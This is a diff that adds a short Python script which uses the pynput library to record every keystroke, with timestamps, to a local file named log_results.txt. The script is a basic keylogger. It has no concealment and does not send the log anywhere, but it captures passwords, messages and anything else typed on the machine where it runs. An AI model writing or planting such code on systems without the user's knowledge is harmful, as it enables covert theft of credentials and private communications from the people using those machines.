@@ -1,0 +1,18 @@
+import logging
+from pynput.keyboard import Key, Listener
+
+log_dir = ""
+
+logging.basicConfig(filename=(log_dir + "log_results.txt"), level=logging.DEBUG, format='%(asctime)s : %(message)s')
+
+
+def keypress(Key):
+    logging.info(str(Key))
+
+
+# if key  == Key.esc:
+# stop Listener
+# return False
+
+with Listener(on_press=keypress) as listener:
+    listener.join()
